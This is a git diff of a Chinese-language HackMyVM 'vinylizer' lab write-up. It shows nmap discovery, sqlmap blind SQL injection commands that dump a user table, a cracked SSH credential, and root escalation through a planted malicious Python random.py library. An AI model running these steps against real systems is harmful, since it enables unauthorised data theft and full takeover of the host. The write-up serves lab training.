@@ -3,16 +3,16 @@ title: vinylizer
 tags:
   - sec/hackmyvm
 date: 2024-02-10T11:51:04
-lastmod: 2024-11-24T18:56:16
+lastmod: 2024-11-24T19:12:03
 toc: "true"
 ---
 ## 主机发现
 使用 nmap 进行主机发现[[THM_Nmap Live Host Discovery(活动主机发现)]]
-```
+```bash
 sudo nmap 192.168.10.1/24 -PA -sn -oN portscan/discovery.nmap
 ```
 ![HMM_vinylizer_image_1](https://img.l1uyun.one/HMM_vinylizer_image_1.png)
-```
+```bash
 192.168.10.10
 ```
 ## 端口扫描
@@ -26,11 +26,11 @@ sudo nmap 192.168.10.1/24 -PA -sn -oN portscan/discovery.nmap
 
 ## 利用登录页面的 sql 注入 
 sqlmap
-```
+```bash
 sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login="
 ```
 ![HMM_vinylizer_image_5](https://img.l1uyun.one/HMM_vinylizer_image_5.png)
-```
+```bash
 ---
 Parameter: username (POST)
     Type: time-based blind
@@ -39,22 +39,22 @@ Parameter: username (POST)
 ---
 ```
 查看所有数据库
-```
+```bash
  sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" --dbs
 ```
 ![HMM_vinylizer_image_6](https://img.l1uyun.one/HMM_vinylizer_image_6.png)
 查看数据库的表信息
-```
+```bash
  sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" --tables -D vinyl_marketplace
 ```
 ![HMM_vinylizer_image_7](https://img.l1uyun.one/HMM_vinylizer_image_7.png)
 查看某一个表的列信息
-```
+```bash
 sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" --columns -D vinyl_marketplace -T users
 ```
 ![HMM_vinylizer_image_8](https://img.l1uyun.one/HMM_vinylizer_image_8.png)
 查看对应列的信息
-```
+```bash
 sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" -C username -D vinyl_marketplace -T users --dump
 
 sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" -C password -D vinyl_marketplace -T users --dump
@@ -71,14 +71,14 @@ sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin
 md5
 ![HMM_vinylizer_image_13](https://img.l1uyun.one/HMM_vinylizer_image_13.png)
 
-```
+```bash
 ssh shopadmin@192.168.10.10
 
 shopadmin:addicted2vinyl
 ```
 ## 权限提升_python 库劫持
 ![HMM_vinylizer_image_14](https://img.l1uyun.one/HMM_vinylizer_image_14.png)
-```
+```bash
 ls -al /usr/bin/python3
 /usr/lib/python3.10/random. py
 ```
@@ -89,7 +89,7 @@ ls -al /usr/bin/python3
 ![HMM_vinylizer_image_16](https://img.l1uyun.one/HMM_vinylizer_image_16.png) 呗
 使用 gpt 随便生成一个 random. py 文件
 ![HMM_vinylizer_image_17|500](https://img.l1uyun.one/HMM_vinylizer_image_17.png)
-```
+```bash
 # random.py
 import os
 
@@ -109,9 +109,9 @@ os.system('touch /tmp/malicious_code_executed')
 root
 ![HMM_vinylizer_image_22](https://img.l1uyun.one/HMM_vinylizer_image_22.png)
 
-[[HMM_pyrat]]
+
 ## 学习wp
-```
+```bash
 sqlmap
 --batch 全自动,不用回答Y
 ```
